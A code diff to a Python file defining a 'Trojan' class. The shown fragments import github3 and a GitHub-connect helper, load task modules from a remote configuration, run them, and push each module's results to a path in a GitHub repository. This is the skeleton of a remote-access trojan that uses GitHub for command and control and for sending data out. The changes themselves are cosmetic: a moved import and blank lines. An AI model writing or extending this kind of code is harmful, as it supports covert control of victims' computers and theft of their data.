@@ -2,11 +2,12 @@ import github3
 import base64
 import sys
 import json
-from datetime import datetime  # Correct import
 import threading
 import time
 import random
 
+
+from datetime import datetime  
 from modules.gitconnect import github_connect, get_file_contents
 
 
@@ -40,6 +41,7 @@ class Trojan:
                     print(f"[ERROR] Failed to import module {task['module']}: {e}")
         return config
 
+
     def module_runner(self, module):
         """
         Run a module and store its result in the repository.
@@ -49,6 +51,7 @@ class Trojan:
             self.store_module_result(result)
         except Exception as e:
             print(f"[ERROR] Failed to run module {module}: {e}")
+
 
     def store_module_result(self, data):
         """
@@ -78,6 +81,7 @@ class Trojan:
             print(f"[INFO] Result stored in {remote_path}")
         except Exception as e:
             print(f"[ERROR] Failed to store result: {e}")
+
 
     def run(self):
         """
